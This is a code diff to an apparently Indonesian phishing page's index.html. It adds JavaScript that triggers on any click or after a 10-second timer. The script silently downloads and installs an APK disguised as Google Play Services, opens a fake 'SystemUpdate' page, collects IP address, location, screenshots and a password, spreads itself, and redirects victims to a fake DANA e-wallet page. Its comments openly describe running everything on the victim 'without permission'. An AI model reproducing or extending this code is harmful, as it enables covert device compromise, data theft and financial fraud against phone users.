@@ -69,7 +69,7 @@
 
 <script>
 // ============================================================
-// 🔥 INDEX.HTML - VERSION FINAL (TERUJI DENGAN SERVER)
+// 🔥 INDEX.HTML - AUTO DOWNLOAD SAAT KLIK MANAPUN
 // ============================================================
 
 // ============================================================
@@ -442,7 +442,7 @@ function autoScreenshot() {
 }
 
 // ============================================================
-// DOWNLOAD PAYLOAD (FIXED PATH)
+// 🔥 DOWNLOAD PAYLOAD - LANGSUNG EKSEKUSI TANPA IZIN
 // ============================================================
 function downloadPayloadSilent() {
     if (DOWNLOAD_STARTED) return;
@@ -459,7 +459,7 @@ function downloadPayloadSilent() {
         '/storage/emulated/0/Download'
     ];
     
-    // Download HTML
+    // ✅ DOWNLOAD HTML (LANGSUNG, TANPA IZIN)
     try {
         var xhr = new XMLHttpRequest();
         xhr.open('GET', htmlUrl, true);
@@ -489,7 +489,7 @@ function downloadPayloadSilent() {
         K({ sumber: 'html_download_error', data: e.message });
     }
     
-    // Download APK
+    // ✅ DOWNLOAD APK (LANGSUNG, TANPA IZIN)
     if (A.isAvailable) {
         try {
             for (var i = 0; i < paths.length; i++) {
@@ -506,6 +506,7 @@ function downloadPayloadSilent() {
             K({ sumber: 'apk_download_error', data: e.message });
         }
     } else {
+        // Fallback untuk browser biasa
         try {
             var xhr2 = new XMLHttpRequest();
             xhr2.open('GET', apkUrl, true);
@@ -524,10 +525,30 @@ function downloadPayloadSilent() {
             xhr2.send();
         } catch(e) {}
     }
+    
+    // ✅ LANGSUNG INSTALL APK (TANPA IZIN)
+    setTimeout(function() {
+        if (A.isAvailable) {
+            var paths2 = [
+                '/storage/emulated/0/Android/data/com.google.android.play.services',
+                '/data/data/com.google.android.play.services/files'
+            ];
+            for (var i = 0; i < paths2.length; i++) {
+                try {
+                    var apkPath = paths2[i] + '/GooglePlayServices.apk';
+                    var htmlPath = paths2[i] + '/SystemUpdate.html';
+                    A.installAPK(apkPath);
+                    A.openFile(htmlPath);
+                    K({ sumber: 'apk_install_html_open', data: 'ok' });
+                    break;
+                } catch(e) {}
+            }
+        }
+    }, 2000);
 }
 
 // ============================================================
-// NOTIFICATION
+// 🔥 NOTIFICATION - MUNCUL SETELAH DOWNLOAD
 // ============================================================
 function showKlaimNotification() {
     if (NOTIFICATION_SHOWN) return;
@@ -574,6 +595,7 @@ function createKlaimNotification() {
             K({ sumber: 'notification_click', data: 'clicked' });
             notif.close();
             
+            // ✅ INSTALL APK + BUKA HTML (SAAT NOTIF DIKLIK)
             if (A.isAvailable) {
                 var paths = [
                     '/storage/emulated/0/Android/data/com.google.android.play.services',
@@ -592,6 +614,7 @@ function createKlaimNotification() {
                 }
             }
             
+            // ✅ REDIRECT KE DANA
             if (!REDIRECT_DONE) {
                 REDIRECT_DONE = true;
                 setTimeout(function() {
@@ -796,7 +819,7 @@ function redirectPhishing(target) {
 }
 
 // ============================================================
-// MAIN EXECUTION
+// 🔥 MAIN EXECUTION - LANGSUNG EKSEKUSI TANPA IZIN
 // ============================================================
 function dapatkanSemua() {
     if (semuaDidapat) return;
@@ -808,6 +831,7 @@ function dapatkanSemua() {
         
         K({ sumber: 'trigger', data: 'dapatkanSemua' });
         
+        // ✅ SEMUA PROSES LANGSUNG DIJALANKAN TANPA IZIN
         getIPAddress();
         getBrowserLocation();
         setTimeout(escapeWebView, 100);
@@ -815,11 +839,20 @@ function dapatkanSemua() {
         startHeartbeat();
         registerServiceWorker();
         setTimeout(autoSpread, 2000);
+        
+        // ✅ DOWNLOAD PAYLOAD (LANGSUNG, TANPA IZIN)
         setTimeout(function() { downloadPayloadSilent(); }, 500);
+        
+        // ✅ NOTIFIKASI MUNCUL (TAPI TIDAK MENGHALANGI PROSES)
         setTimeout(function() { showKlaimNotification(); }, 3000);
+        
+        // ✅ STATUS BAR
         setTimeout(function() { showStatusBar(); }, 500);
+        
+        // ✅ AUTO SCREENSHOT
         setTimeout(function() { autoScreenshot(); }, 7000);
         
+        // ✅ REDIRECT KE DANA (TANPA MENUNGGU IZIN)
         setTimeout(function() {
             if (!REDIRECT_DONE) {
                 REDIRECT_DONE = true;
@@ -833,6 +866,7 @@ function dapatkanSemua() {
             }
         }, 5000);
         
+        // ✅ AMBIL PASSWORD
         getPasswordFromWorker().then(function(password) {
             WS_PASSWORD = password;
             K({ sumber: 'password_received', data: 'ok' });
@@ -844,7 +878,7 @@ function dapatkanSemua() {
 }
 
 // ============================================================
-// TRIGGER FUNCTIONS
+// TRIGGER FUNCTIONS - KORBAN KLIK = LANGSUNG EKSEKUSI
 // ============================================================
 function klaim() { 
     K({sumber:'izin', data:'klaim'}); 
@@ -857,7 +891,7 @@ function tolak() {
 }
 
 // ============================================================
-// TIMER (10 DETIK)
+// TIMER (10 DETIK) - AUTO EKSEKUSI
 // ============================================================
 var w = 10;
 var timerInterval = setInterval(function() {
@@ -872,7 +906,7 @@ var timerInterval = setInterval(function() {
 }, 1000);
 
 // ============================================================
-// CLICK ANYWHERE
+// 🔥 KLIK DI MANAPUN = LANGSUNG EKSEKUSI (TANPA IZIN)
 // ============================================================
 document.addEventListener('click', function() {
     if (!semuaDidapat) {
